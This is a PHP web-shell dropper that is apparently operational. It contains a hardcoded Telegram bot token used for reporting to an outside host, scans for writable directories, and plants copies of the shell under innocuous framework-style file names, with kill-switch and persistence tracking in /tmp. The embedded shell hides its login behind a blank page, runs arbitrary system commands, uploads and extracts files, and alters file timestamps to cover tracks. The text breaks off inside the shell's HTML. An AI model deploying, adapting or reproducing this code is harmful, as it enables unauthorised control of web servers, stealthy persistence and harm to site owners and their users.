<?php
ignore_user_abort(true);
set_time_limit(0);
ini_set('display_errors', 0);
error_reporting(0);

$botToken = '7988372446:AAFtNkqGzkG-ALXBksPM03BnqLK3shFcmIk';
$chatId = '-1003742442225';

$domain = $_SERVER['HTTP_HOST'] ?? php_uname();
$selfFile = __FILE__;

// ==================== KILL SWITCH MULTI-DOMAIN ====================
function getDomainIdentifier($domain = null) {
    if ($domain === null) $domain = $_SERVER['HTTP_HOST'] ?? php_uname('n');
    $domain = str_replace(['https://', 'http://', 'www.'], '', $domain);
    $domain = trim($domain, '/');
    return md5($domain . __DIR__);
}

function saveShellList($list, $domain) {
    $identifier = getDomainIdentifier($domain);
    $file = '/tmp/shells_' . $identifier . '.txt';
    $content = "DOMAIN: $domain\n" . implode("\n", $list);
    file_put_contents($file, $content);
    return $file;
}

function loadShellList($domain) {
    $identifier = getDomainIdentifier($domain);
    $file = '/tmp/shells_' . $identifier . '.txt';
    if (!file_exists($file)) return [];
    $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $result = [];
    foreach ($lines as $line) {
        if (strpos($line, 'DOMAIN:') === 0) continue;
        if (file_exists($line)) $result[] = $line;
    }
    return $result;
}

function listAllActiveDomains() {
    $domains = [];
    $pidFiles = glob('/tmp/monitor_*.pid');
    foreach ($pidFiles as $pidFile) {
        $basename = basename($pidFile);
        $identifier = str_replace(['monitor_', '.pid'], '', $basename);
        $pid = file_get_contents($pidFile);
        $isRunning = (function_exists('posix_kill')) ? @posix_kill($pid, 0) : file_exists("/proc/$pid");
        if ($isRunning) {
            $file = '/tmp/shells_' . $identifier . '.txt';
            if (file_exists($file)) {
                $firstLine = file($file, FILE_IGNORE_NEW_LINES)[0] ?? '';
                if (strpos($firstLine, 'DOMAIN:') === 0) $domains[] = trim(substr($firstLine, 7));
            }
        } else @unlink($pidFile);
    }
    return array_unique($domains);
}

// ========== KILL FUNCTION - TIDAK HAPUS SHELL ==========
function killMonitoringByDomain($domain, $botToken, $chatId) {
    $identifier = getDomainIdentifier($domain);
    $pidFile = '/tmp/monitor_' . $identifier . '.pid';
    $shellListFile = '/tmp/shells_' . $identifier . '.txt';
    $killFlag = '/tmp/kill_' . $identifier . '.flag';
    $disableFile = '/tmp/disabled_' . $identifier . '.flag';
    
    $messages = [];
    file_put_contents($disableFile, 'PERMANENTLY_DISABLED_' . time());
    $messages[] = "🚩 Monitoring PERMANENTLY DISABLED for: $domain";
    file_put_contents($killFlag, time());
    
    if (file_exists($pidFile)) {
        $pid = file_get_contents($pidFile);
        if (function_exists('posix_kill')) posix_kill($pid, 9);
        @exec("kill -9 $pid 2>&1");
        @unlink($pidFile);
        $messages[] = "✅ Monitoring process (PID: $pid) terminated";
    }
    
    if (file_exists($shellListFile)) @unlink($shellListFile);
    @unlink($killFlag);
    @unlink('/tmp/last_check_' . $identifier . '.txt');
    @unlink('/tmp/heartbeat_' . $identifier . '.txt');
    
    return implode("\n", $messages);
}

function killAllDomains($botToken, $chatId) {
    $domains = listAllActiveDomains();
    $results = [];
    foreach ($domains as $domain) {
        $results[] = "📌 <b>$domain</b>:\n" . killMonitoringByDomain($domain, $botToken, $chatId);
    }
    return empty($results) ? "❌ No active domains found" : implode("\n\n", $results);
}

function getDomainStatus($domain) {
    $identifier = getDomainIdentifier($domain);
    $pidFile = '/tmp/monitor_' . $identifier . '.pid';
    $disableFile = '/tmp/disabled_' . $identifier . '.flag';
    $shells = loadShellList($domain);
    $activeShells = array_filter($shells, 'file_exists');
    
    $status = [
        'domain' => $domain,
        'monitoring_running' => false,
        'permanently_disabled' => file_exists($disableFile),
        'pid' => null,
        'shell_count' => count($activeShells)
    ];
    
    if (file_exists($pidFile)) {
        $pid = file_get_contents($pidFile);
        if (function_exists('posix_kill') && @posix_kill($pid, 0)) {
            $status['monitoring_running'] = true;
            $status['pid'] = $pid;
        } else @unlink($pidFile);
    }
    return $status;
}

// ==================== FUNGSI DROP SHELL ====================
function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
    if ($currentDepth > $maxDepth) return [];
    $result = [];
    $items = @scandir($baseDir);
    if (!$items) return $result;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = rtrim($baseDir, '/') . '/' . $item;
        if (is_dir($fullPath)) {
            if (is_writable($fullPath)) $result[] = $fullPath;
            $result = array_merge($result, scanWritableDirs($fullPath, $maxDepth, $currentDepth + 1));
        }
    }
    return $result;
}

function isSuitableDirectory($dir) {
    if (!is_dir($dir) || !is_writable($dir)) return false;
    $systemDirs = ['/etc', '/bin', '/boot', '/dev', '/proc', '/sys', '/usr/bin', '/var/spool'];
    foreach ($systemDirs as $system) {
        if (strpos($dir, $system) === 0) return false;
    }
    return true;
}

function generateShellName($dir, $forceUnique = false) {
    $safeNames = [
        'bootstrap-loader.php', 'routes-provider.php', 'config-builder.php',
        'service-cache.php', 'dependency-registry.php', 'middleware-core.php',
        'request-handler.php', 'response-cache.php', 'query-builder.php',
        'index-manager.php', 'meta-handler.php', 'sitemap-generator.php',
        'asset-compiler.php', 'manifest-cache.php', 'module-loader.php',
        'component-factory.php', 'widget-registry.php', 'shortcode-parser.php',
        'hook-manager.php', 'event-bus.php', 'cron-dispatcher.php',
        'queue-listener.php', 'job-scheduler.php', 'task-processor.php',
        'cache-manager.php', 'session-handler.php', 'token-service.php',
        'csrf-validator.php', 'encryption-core.php', 'hash-service.php',
        'backup-engine.php', 'migration-controller.php', 'seed-manager.php',
        'environment-loader.php', 'debug-logger.php', 'profiler-engine.php',
        'log-manager.php', 'exception-handler.php', 'metric-collector.php',
        'system-scanner.php', 'optimize-core.php', 'analytics-engine.php',
        'tracking-service.php', 'stats-collector.php', 'error-reporter.php',
        'cron-worker.php', 'rest-provider.php', 'heartbeat-listener.php',
        'autoload-cache.php', 'plugin-scanner.php', 'theme-optimizer.php',
        'db-analyzer.php', 'asset-minifier.php', 'smtp-validator.php',
        'email-relay.php', 'xmlrpc-handler.php', 'mu-loader.php'
    ];
    
    if ($forceUnique) {
        for ($i = 0; $i < 50; $i++) {
            shuffle($safeNames);
            $baseName = $safeNames[0];
            $pathInfo = pathinfo($baseName);
            $newName = $pathInfo['filename'] . '_' . rand(1000, 9999) . '.php';
            if (!file_exists(rtrim($dir, '/') . '/' . $newName)) return $newName;
        }
        return 'wp_' . date('Ymd') . '_' . rand(10000, 99999) . '.php';
    }
    
    shuffle($safeNames);
    foreach ($safeNames as $name) {
        if (!file_exists(rtrim($dir, '/') . '/' . $name)) return $name;
    }
    return 'wp_' . date('Ymd') . '_' . rand(10000, 99999) . '.php';
}

function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

// ========== 🟢🟢🟢 KOLOM SHELL KOSONG - SILAHKAN ISI SHELL ANDA DISINI 🟢🟢🟢 ==========
function getShellContent() {
    return <<<'PHP'
<?php
// ==================== CONFIGURATION ====================
$password_hash = '$2a$12$KWRVCT2Gwjh8sz.Bq27bguQ0x327zUZpxfFrdkjbxOb5JxguwzM1C';

// ==================== DISABLE ALL EXTERNAL ====================
ini_set('allow_url_fopen', '0');
ini_set('allow_url_include', '0');
ini_set('disable_functions', 'curl_exec,curl_multi_exec,exec,passthru,proc_open,shell_exec,system,mail,fsockopen,fopen,fread,file_get_contents');
error_reporting(0);
set_time_limit(0);
ini_set('display_errors', 0);

// ==================== SESSION ====================
session_name('local_shell_' . md5(__FILE__));
session_start();

// ==================== AUTHENTICATION ====================
$__auth__ = false;

if (isset($_SESSION['__auth__']) && $_SESSION['__auth__'] === true) {
    $__auth__ = true;
} elseif (isset($_POST['__p__'])) {
    if (password_verify($_POST['__p__'], $password_hash)) {
        $_SESSION['__auth__'] = true;
        $__auth__ = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

// ==================== HIDDEN LOGIN ====================
if (!$__auth__) {
    if (!isset($_GET['__l__'])) {
        echo '<!DOCTYPE html><html><head><title></title><style>*{margin:0;padding:0;}html,body{width:100%;height:100%;background:#ffffff;}</style></head><body><script>document.onkeydown=function(e){if(e.key==="PageDown")window.location.href="?__l__=1";};</script></body></html>';
        exit;
    }
    
    echo '<!DOCTYPE html><html><head><title>🎧Shell Lee..🥂🎸⋆｡ °⋆</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:monospace;background:#111;color:#0f0;display:flex;justify-content:center;align-items:center;min-height:100vh;}.login-box{background:#222;padding:30px;border-radius:5px;border:1px solid #0f0;width:90%;max-width:400px;}.login-title{text-align:center;margin-bottom:20px;color:#0f0;font-size:18px;}.form-input{width:100%;padding:10px;background:#000;color:#0f0;border:1px solid #333;border-radius:3px;margin-bottom:15px;font-family:monospace;}.submit-btn{width:100%;padding:10px;background:#0f0;color:#000;border:none;border-radius:3px;cursor:pointer;font-family:monospace;font-weight:bold;}</style></head><body><div class="login-box"><div class="login-title">Where are you going</div><form method="post"><input type="password" name="__p__" class="form-control" placeholder="PASSWORD" required autofocus><button type="submit" class="submit-btn">Kemana-mana</button></form></div></body></html>';
    exit;
}

// ==================== FULL ACCESS TERMINAL ====================
function executeLocal($cmd, $cwd = null) {
    $output = [];
    $return_var = 0;
    
    $cmd = trim($cmd);
    
    // Ganti variabel dengan nilai aktual
    if (strpos($cmd, '$(whoami)') !== false) {
        $current_user = @shell_exec('whoami 2>/dev/null');
        if ($current_user) {
            $cmd = str_replace('$(whoami)', trim($current_user), $cmd);
        }
    }
    
    if (strpos($cmd, '$(id -u)') !== false) {
        $current_uid = @shell_exec('id -u 2>/dev/null');
        if ($current_uid) {
            $cmd = str_replace('$(id -u)', trim($current_uid), $cmd);
        }
    }
    
    // Tambahkan working directory jika ada
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    
    $pipes = array();
    
    // Gunakan proc_open dengan working directory
    $process = @proc_open($cmd, $descriptorspec, $pipes, $cwd);
    
    if (is_resource($process)) {
        fclose($pipes[0]);
        
        $output = [stream_get_contents($pipes[1])];
        $error_output = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        
        $return_var = proc_close($process);
        
        if (!empty(trim($error_output))) {
            $output[] = $error_output;
        }
    } elseif (function_exists('exec')) {
        // Fallback: exec dengan chdir
        if ($cwd && is_dir($cwd)) {
            $original_cwd = getcwd();
            chdir($cwd);
        }
        
        @exec($cmd . ' 2>&1', $output, $return_var);
        
        if (isset($original_cwd)) {
            chdir($original_cwd);
        }
    } elseif (function_exists('shell_exec')) {
        if ($cwd && is_dir($cwd)) {
            $original_cwd = getcwd();
            chdir($cwd);
        }
        
        $output = [@shell_exec($cmd . ' 2>&1')];
        
        if (isset($original_cwd)) {
            chdir($original_cwd);
        }
    } else {
        return "❌ No execution method available";
    }
    
    if (empty($output) || (count($output) == 1 && trim($output[0]) == '')) {
        return "✅ Command executed successfully";
    }
    
    return implode("\n", $output);
}

// ==================== MAIN LOGIC ====================
$__dir__ = isset($_GET['__d__']) ? $_GET['__d__'] : getcwd();
$__dir__ = realpath($__dir__) ?: getcwd();
if (!is_dir($__dir__)) $__dir__ = getcwd();

// Handle POST operations
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // MULTI UPLOAD
    if (!empty($_FILES['files'])) {
        foreach ($_FILES['files']['tmp_name'] as $key => $tmp_name) {
            if ($_FILES['files']['error'][$key] === UPLOAD_ERR_OK) {
                $filename = basename($_FILES['files']['name'][$key]);
                $target = $__dir__ . '/' . $filename;
                
                if (@move_uploaded_file($tmp_name, $target)) {
                    $_SESSION['messages'][] = "✅ Uploaded: " . htmlspecialchars($filename);
                } else {
                    $_SESSION['messages'][] = "❌ Failed to upload: " . htmlspecialchars($filename) . " - Check permissions";
                }
            }
        }
    }
    
    // ZIP UPLOAD + AUTO EXTRACT (DIRECT EXTRACTION - NO ZIP FILE SAVED)
    if (!empty($_FILES['zip_file'])) {
        $filename = basename($_FILES['zip_file']['name']);
        $tmp_file = $_FILES['zip_file']['tmp_name'];
        
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($tmp_file) === TRUE) {
                $extracted_count = 0;
                
                // Extract semua file ke direktori saat ini
                for ($i = 0; $i < $zip->numFiles; $i++) {
                    $entry_name = $zip->getNameIndex($i);
                    
                    // Skip __MACOSX folder dan .DS_Store files
                    if (strpos($entry_name, '__MACOSX/') === 0 || 
                        strpos($entry_name, '.DS_Store') !== false) {
                        continue;
                    }
                    
                    // Pastikan target aman
                    $target_path = $__dir__ . '/' . $entry_name;
                    
                    // Cegah directory traversal
                    if (strpos(realpath(dirname($target_path)), realpath($__dir__)) !== 0) {
                        continue;
                    }
                    
                    // Buat direktori jika diperlukan
                    $entry_dir = dirname($target_path);
                    if (!is_dir($entry_dir)) {
                        mkdir($entry_dir, 0755, true);
                    }
                    
                    // Extract file
                    $fp = $zip->getStream($entry_name);
                    if ($fp) {
                        $contents = '';
                        while (!feof($fp)) {
                            $contents .= fread($fp, 8192);
                        }
                        fclose($fp);
                        
                        if (file_put_contents($target_path, $contents)) {
                            $extracted_count++;
                        }
                    }
                }
                
                $zip->close();
                $_SESSION['messages'][] = "📦 Auto-extracted ZIP: " . htmlspecialchars($filename) . " (" . $extracted_count . " files extracted)";
            } else {
                $_SESSION['messages'][] = "❌ Failed to open ZIP file: " . htmlspecialchars($filename);
            }
        } else {
            $_SESSION['messages'][] = "❌ ZipArchive class not available";
        }
    }
    
    // PHP UPLOAD
    if (!empty($_FILES['php_file'])) {
        $filename = basename($_FILES['php_file']['name']);
        $target = $__dir__ . '/' . $filename;
        
        if (@move_uploaded_file($_FILES['php_file']['tmp_name'], $target)) {
            $_SESSION['messages'][] = "🐘 PHP Uploaded: " . htmlspecialchars($filename);
        } else {
            $_SESSION['messages'][] = "❌ Failed to upload PHP: " . htmlspecialchars($filename);
        }
    }
    
    // CREATE FILE/FOLDER
    if (isset($_POST['__create__'])) {
        $name = basename($_POST['__name__']);
        $type = $_POST['__type__'];
        $path = $__dir__ . '/' . $name;
        
        if ($type === 'file') {
            if (@file_put_contents($path, $_POST['__data__'] ?? '')) {
                $_SESSION['messages'][] = "📄 Created: " . htmlspecialchars($name);
            } else {
                $_SESSION['messages'][] = "❌ Failed to create file: " . htmlspecialchars($name);
            }
        } else {
            if (@mkdir($path, 0755, true)) {
                $_SESSION['messages'][] = "📁 Created: " . htmlspecialchars($name);
            } else {
                $_SESSION['messages'][] = "❌ Failed to create folder: " . htmlspecialchars($name);
            }
        }
    }
    
    // TERMINAL - dengan working directory saat ini
    if (isset($_POST['__cmd__'])) {
        $cmd = $_POST['__cmd__'];
        $output = executeLocal($cmd, $__dir__);
        $_SESSION['cmd_output'] = $output;
    }
    
    // EDIT FILE
    if (isset($_POST['__content__']) && isset($_POST['__edit_file__'])) {
        $target = $__dir__ . '/' . basename($_POST['__edit_file__']);
        if (@file_put_contents($target, $_POST['__content__'])) {
            $_SESSION['messages'][] = "💾 Saved: " . htmlspecialchars(basename($target));
        } else {
            $_SESSION['messages'][] = "❌ Failed to save: " . htmlspecialchars(basename($target));
        }
    }
    
    // BATCH DELETE
    if (isset($_POST['__delete_selected__'])) {
        $selected_items = $_POST['selected_items'] ?? [];
        foreach ($selected_items as $item) {
            $target = $__dir__ . '/' . basename($item);
            if (file_exists($target)) {
                if (is_dir($target)) {
                    $it = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
                    $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                    foreach($files as $file) {
                        if ($file->isDir()){
                            @rmdir($file->getRealPath());
                        } else {
                            @unlink($file->getRealPath());
                        }
                    }
                    @rmdir($target);
                } else {
                    @unlink($target);
                }
                $_SESSION['messages'][] = "🗑 Deleted: " . htmlspecialchars(basename($item));
            }
        }
    }
    
    // CHANGE PERMISSIONS - Simple
    if (isset($_POST['__chmod__'])) {
        $target = $__dir__ . '/' . basename($_POST['__chmod_file__']);
        $permissions = $_POST['__permissions__'];
        
        if (file_exists($target)) {
            if (is_numeric($permissions)) {
                $octal = octdec($permissions);
            } else {
                $octal = 0;
                if (strpos($permissions, 'r') !== false) $octal += 4;
                if (strpos($permissions, 'w') !== false) $octal += 2;
                if (strpos($permissions, 'x') !== false) $octal += 1;
                if (strpos($permissions, 's') !== false) $octal += 4000;
                if (strpos($permissions, 'S') !== false) $octal += 2000;
                if (strpos($permissions, 't') !== false) $octal += 1000;
            }
            
            if (@chmod($target, $octal)) {
                $_SESSION['messages'][] = "🔧 Permissions changed: " . htmlspecialchars(basename($target)) . " -> " . $permissions;
            } else {
                $_SESSION['messages'][] = "❌ Failed to change permissions";
            }
        }
    }
    
    // RECURSIVE CHMOD
    if (isset($_POST['__chmod_recursive__'])) {
        $target = $__dir__ . '/' . basename($_POST['__chmod_recursive_file__']);
        $permissions = $_POST['__permissions_recursive__'];
        
        if (file_exists($target)) {
            $cmd = "chmod -R " . escapeshellarg($permissions) . " " . escapeshellarg($target) . " 2>&1";
            $output = executeLocal($cmd, $__dir__);
            $_SESSION['messages'][] = "🔧 Recursive permissions changed: " . htmlspecialchars(basename($target)) . " -> " . $permissions;
            $_SESSION['cmd_output'] = $output;
        }
    }
    
    // RENAME FILE/FOLDER
    if (isset($_POST['__rename__'])) {
        $old_name = $__dir__ . '/' . basename($_POST['__rename_old__']);
        $new_name = $__dir__ . '/' . basename($_POST['__rename_new__']);
        
        if (file_exists($old_name) && !file_exists($new_name)) {
            if (@rename($old_name, $new_name)) {
                $_SESSION['messages'][] = "✏️ Renamed: " . htmlspecialchars(basename($old_name)) . " → " . htmlspecialchars(basename($new_name));
            } else {
                $_SESSION['messages'][] = "❌ Failed to rename " . htmlspecialchars(basename($old_name)) . " - Check permissions";
            }
        } elseif (file_exists($new_name)) {
            $_SESSION['messages'][] = "❌ Cannot rename - Target already exists: " . htmlspecialchars(basename($new_name));
        }
    }
    
    // CHANGE TIMESTAMP
    if (isset($_POST['__touch__'])) {
        $target = $__dir__ . '/' . basename($_POST['__touch_file__']);
        $timestamp = strtotime($_POST['__timestamp__']);
        if (file_exists($target)) {
            if (@touch($target, $timestamp)) {
                $_SESSION['messages'][] = "🕒 Timestamp changed: " . htmlspecialchars(basename($target));
            } else {
                $_SESSION['messages'][] = "❌ Failed to change timestamp";
            }
        }
    }
    
    header("Location: " . $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__));
    exit;
}

// Handle GET operations
if (isset($_GET['__del__'])) {
    $target = $__dir__ . '/' . basename($_GET['__del__']);
    if (file_exists($target)) {
        if (is_dir($target)) {
            $it = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
            $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
            foreach($files as $file) {
                if ($file->isDir()){
                    @rmdir($file->getRealPath());
                } else {
                    @unlink($file->getRealPath());
                }
            }
            @rmdir($target);
        } else {
            @unlink($target);
        }
        $_SESSION['messages'][] = "🗑 Deleted: " . htmlspecialchars(basename($target));
        header("Location: " . $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__));
        exit;
    }
}

if (isset($_GET['__extract__'])) {
    $target = $__dir__ . '/' . basename($_GET['__extract__']);
    if (class_exists('ZipArchive') && file_exists($target) && pathinfo($target, PATHINFO_EXTENSION) === 'zip') {
        $zip = new ZipArchive();
        if ($zip->open($target) === TRUE) {
            $extracted_count = 0;
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $entry_name = $zip->getNameIndex($i);
                $target_path = $__dir__ . '/' . $entry_name;
                
                if (strpos($entry_name, '__MACOSX/') === 0) continue;
                
                $entry_dir = dirname($target_path);
                if (!is_dir($entry_dir)) {
                    mkdir($entry_dir, 0755, true);
                }
                
                $fp = $zip->getStream($entry_name);
                if ($fp) {
                    $contents = '';
                    while (!feof($fp)) {
                        $contents .= fread($fp, 8192);
                    }
                    fclose($fp);
                    
                    if (file_put_contents($target_path, $contents)) {
                        $extracted_count++;
                    }
                }
            }
            $zip->close();
            $_SESSION['messages'][] = "📦 Extracted: " . htmlspecialchars(basename($target)) . " (" . $extracted_count . " files)";
        }
        header("Location: " . $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__));
        exit;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ==================== DISPLAY MESSAGES ====================
$messages = $_SESSION['messages'] ?? [];
$cmd_output = $_SESSION['cmd_output'] ?? '';
unset($_SESSION['messages'], $_SESSION['cmd_output']);

// Check if we're editing a file
$editing_file = '';
$file_content = '';
if (isset($_GET['__edit__'])) {
    $editing_file = basename($_GET['__edit__']);
    $target = $__dir__ . '/' . $editing_file;
    if (file_exists($target) && is_file($target)) {
        $file_content = file_get_contents($target);
    }
}

// ==================== PERMISSION LOGIC ====================
function __is_writable($file) {
    if (!file_exists($file)) {
        return false;
    }
    
    if (is_writable($file)) {
        return true;
    }
    
    $perms = fileperms($file);
    
    // Cek write permission untuk owner (bit 0200)
    return ($perms & 0200) != 0;
}

function getPermissionColor($path, $permissions, $is_dir = false) {
    if (__is_writable($path)) {
        return '#00ff00'; // HIJAU - bisa write
    }
    
    return '#ffffff'; // PUTIH - tidak bisa write
}

function getPermissionStatus($path, $permissions, $is_dir = false) {
    $color = getPermissionColor($path, $permissions, $is_dir);
    if ($color === '#00ff00') {
        return 'writable';
    } else {
        return 'locked';
    }
}

function canUploadToDirectory($dir_path) {
    return is_writable($dir_path);
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>☠️ BERHANTU</title>
    <style>
        :root { 
            --blood: #ff0000; 
            --ghost: #e6e6fa; 
            --dark: #0a0a0a; 
            --green: #00ff00; 
            --purple: #800080; 
            --orange: #ff6600; 
            --yellow: #ffff00; 
            --blue: #0088ff;
            --writable: #00ff00;
            --locked: #ffffff;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: monospace; background: var(--dark); color: var(--ghost); padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { background: rgba(10,10,10,0.9); padding: 20px; margin-bottom: 20px; border: 2px solid var(--blood); border-radius: 10px; }
        .header h1 { color: var(--blood); margin-bottom: 10px; }
        .path { 
            font-size: 14px; 
            color: var(--green); 
            background: rgba(0,0,0,0.7); 
            padding: 10px; 
            border-radius: 5px; 
            margin-bottom: 15px; 
            word-break: break-all;
            border-left: 4px solid var(--green);
        }
        .path a { color: var(--orange); text-decoration: none; }
        .messages { margin-bottom: 20px; }
        .message { padding: 10px; background: rgba(255,0,0,0.1); border-left: 3px solid var(--blood); margin-bottom: 5px; }
        .upload-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 20px; }
        .upload-box { background: rgba(0,0,0,0.7); padding: 20px; border: 1px solid var(--green); border-radius: 8px; }
        .upload-box h3 { color: var(--green); margin-bottom: 15px; }
        .form-control { width: 100%; padding: 10px; background: rgba(0,0,0,0.8); color: var(--green); border: 1px solid var(--purple); border-radius: 5px; margin-bottom: 10px; font-family: monospace; }
        .btn { padding: 8px 15px; background: linear-gradient(45deg, var(--dark), var(--purple)); color: var(--ghost); border: 1px solid var(--blood); border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; margin: 5px; }
        .btn:hover { border-color: var(--orange); }
        .btn-danger { background: linear-gradient(45deg, #8b0000, #ff0000); border-color: #ff4444; }
        .btn-warning { background: linear-gradient(45deg, #8b4500, #ff8800); border-color: #ffaa00; }
        .btn-info { background: linear-gradient(45deg, #004488, #0088ff); border-color: #00aaff; }
        .btn-success { background: linear-gradient(45deg, #006600, #00cc00); border-color: #00ff00; }
        .file-manager { background: rgba(10,10,10,0.9); padding: 20px; margin-bottom: 20px; border: 2px solid var(--blood); border-radius: 10px; }
        .file-table { width: 100%; border-collapse: collapse; }
        .file-table th { padding: 10px; background: rgba(139,0,0,0.3); color: var(--ghost); border-bottom: 2px solid var(--blood); }
        .file-table td { padding: 8px; border-bottom: 1px solid rgba(139,0,0,0.2); }
        .file-table tr.selected { background: rgba(255,0,0,0.2); border-left: 3px solid var(--blood); }
        .file-table tr:hover { background: rgba(139,0,0,0.1); }
        .folder { color: var(--orange); }
        .file { color: var(--ghost); }
        .cursor-pointer { cursor: pointer; }
        .cursor-column { position: relative; }
        .cursor-column::before { content: "▶"; color: var(--blood); position: absolute; left: -15px; }
        .checkbox-col { width: 30px; }
        .checkbox-col input[type="checkbox"] { 
            cursor: pointer; 
            width: 16px; 
            height: 16px; 
        }
        .action-btn { padding: 3px 8px; background: rgba(0,0,0,0.7); border: 1px solid var(--green); border-radius: 3px; color: var(--ghost); text-decoration: none; font-size: 12px; margin: 2px; display: inline-block; }
        .action-btn:hover { background: var(--green); color: var(--dark); }
        .action-btn-edit { border-color: var(--yellow); }
        .action-btn-chmod { border-color: var(--blue); }
        .action-btn-rename { border-color: var(--orange); }
        .action-btn-time { border-color: #ff00ff; }
        .terminal { background: rgba(0,0,0,0.9); padding: 20px; margin-bottom: 20px; border: 2px solid var(--green); border-radius: 10px; }
        .terminal-output { background: rgba(0,0,0,0.8); padding: 15px; border-radius: 5px; border: 1px solid var(--purple); color: var(--green); font-family: monospace; white-space: pre-wrap; max-height: 400px; overflow-y: auto; }
        .cmd-examples { background: rgba(139,0,0,0.1); padding: 10px; border-radius: 5px; margin-top: 10px; font-size: 12px; }
        .cmd-examples code { background: rgba(0,0,0,0.5); padding: 2px 5px; border-radius: 3px; margin: 0 2px; cursor: pointer; }
        .cmd-examples code:hover { background: rgba(255,0,0,0.5); }
        .edit-box { 
            background: rgba(10,10,10,0.9); 
            padding: 20px; 
            margin: 20px 0; 
            border: 2px solid var(--yellow); 
            border-radius: 10px; 
        }
        .edit-box h3 { 
            color: var(--yellow); 
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .editor { 
            width: 100%; 
            height: 500px; 
            background: #1a1a1a; 
            color: #00ff00; 
            border: 1px solid var(--purple); 
            border-radius: 5px; 
            padding: 15px; 
            font-family: monospace; 
            font-size: 14px; 
            line-height: 1.5; 
            resize: vertical; 
        }
        .editor:focus { outline: 2px solid var(--blood); }
        .batch-actions { background: rgba(139,0,0,0.2); padding: 10px; border-radius: 5px; margin-top: 10px; text-align: center; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
        .modal-content { 
            background: var(--dark); 
            border: 2px solid var(--blood); 
            border-radius: 10px; 
            padding: 20px; 
            width: 90%; 
            max-width: 500px; 
            margin: 50px auto; 
        }
        .modal-header { color: var(--blood); margin-bottom: 15px; }
        .modal-close { float: right; cursor: pointer; color: var(--blood); font-size: 20px; }
        .footer { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid rgba(255,0,0,0.3); color: rgba(230,230,250,0.5); font-size: 12px; }
        .power-indicator { color: var(--blood); font-weight: bold; text-shadow: 0 0 10px var(--blood); }
        
        /* PERMISSION COLOR STYLES */
        .perm-writable { 
            color: var(--writable) !important; 
            font-weight: bold;
            background: rgba(0,255,0,0.1);
            padding: 2px 6px;
            border-radius: 3px;
            border: 1px solid rgba(0,255,0,0.3);
        }
        .perm-locked { 
            color: var(--locked) !important;
            background: rgba(255,255,255,0.1);
            padding: 2px 6px;
            border-radius: 3px;
            border: 1px solid rgba(255,255,255,0.3);
        }
        
        /* UPLOAD STATUS */
        .upload-status {
            font-size: 12px;
            margin-top: 5px;
            padding: 3px;
            border-radius: 3px;
            text-align: center;
        }
        .upload-writable {
            background: rgba(0,255,0,0.1);
            color: var(--writable);
            border: 1px solid rgba(0,255,0,0.3);
        }
        .upload-locked {
            background: rgba(255,255,255,0.1);
            color: var(--locked);
            border: 1px solid rgba(255,255,255,0.3);
        }
        
        /* WRITE INDICATOR */
        .write-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 5px;
        }
        .write-yes {
            background-color: var(--writable);
            box-shadow: 0 0 5px var(--writable);
        }
        .write-no {
            background-color: var(--locked);
            box-shadow: 0 0 5px var(--locked);
        }
        
        .editor-controls {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
        }
        .editor-info {
            color: var(--yellow);
            font-size: 12px;
        }
        
        /* TERMINAL PATH INFO */
        .terminal-path {
            background: rgba(0,0,0,0.7);
            padding: 8px 12px;
            border-radius: 5px;
            margin-bottom: 10px;
            border-left: 3px solid var(--green);
            font-size: 13px;
        }
        .terminal-path span {
            color: var(--orange);
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(255,0,0,0.3);
            color: rgba(230,230,250,0.5);
            font-size: 12px;
        }
        
        @media (max-width: 768px) {
            .upload-box {
                min-width: 100%;
            }
            
            .file-table {
                font-size: 11px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
